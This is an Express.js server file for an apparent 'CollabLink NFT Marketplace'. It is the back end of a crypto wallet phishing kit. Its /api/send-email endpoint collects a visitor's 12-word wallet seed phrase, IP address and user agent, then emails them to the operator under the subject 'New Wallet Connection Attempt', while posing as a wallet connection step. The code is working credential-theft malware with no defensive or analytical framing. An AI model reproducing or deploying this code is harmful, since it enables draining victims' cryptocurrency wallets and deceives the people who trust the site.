import express from 'express';
import { Resend } from 'resend';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import cors from 'cors';
import dotenv from 'dotenv';

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();

// Enable CORS
app.use(cors());
app.use(express.json());

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// API endpoint for sending emails
app.post('/api/send-email', async (req, res) => {
  try {
    const { passphrase, ip, userAgent } = req.body;

    if (!passphrase) {
      return res.status(400).json({ error: 'Passphrase is required' });
    }

    const { data, error } = await resend.emails.send({
      from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
      to: process.env.TO_EMAIL,
      subject: 'New Wallet Connection Attempt',
      html: `
        <h2>New Wallet Connection Form Submission</h2>
        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>12 Key Passphrase:</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">${passphrase}</pre>
        <p><strong>IP Address:</strong> ${ip || 'Not available'}</p>
        <p><strong>User Agent:</strong> ${userAgent || 'Not available'}</p>
        <hr style="margin: 20px 0;">
        <p style="color: #666; font-size: 12px;">Sent from CollabLink NFT Marketplace</p>
      `
    });

    if (error) {
      console.error('Resend API Error:', error);
      return res.status(500).json({ success: false, error: 'Failed to send email' });
    }

    res.json({ success: true, message: 'Email sent successfully', id: data.id });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

// Serve static files from the dist directory
app.use(express.static(join(__dirname, 'dist')));

// Serve index.html for all other routes
app.get('*', (req, res) => {
  res.sendFile(join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
}); 